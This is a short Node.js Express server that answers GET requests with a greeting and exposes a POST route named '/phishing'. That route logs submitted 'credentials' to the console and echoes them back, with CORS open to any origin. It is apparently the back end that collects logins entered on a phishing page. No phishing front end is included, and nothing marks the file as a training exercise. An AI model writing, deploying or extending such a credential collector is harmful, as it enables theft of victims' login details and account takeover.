const express = require('express')
const cors = require('cors')

const app = express()
app.use(cors())

app.use(express.urlencoded({
    extended: true
}))

app.use(express.json( {
    limit: '10mb'
}))

app.get('/', (req, res) => {

    res.json({ hello : 'you made a GET REQUEST'})

})

app.post('/phishing', (req, res) => {
    const body = req.body
    console.log(body.credentials)
    res.json({credentials : body.credentials})
})


app.listen(3000, () => {
    console.log('Server running at 3000')
})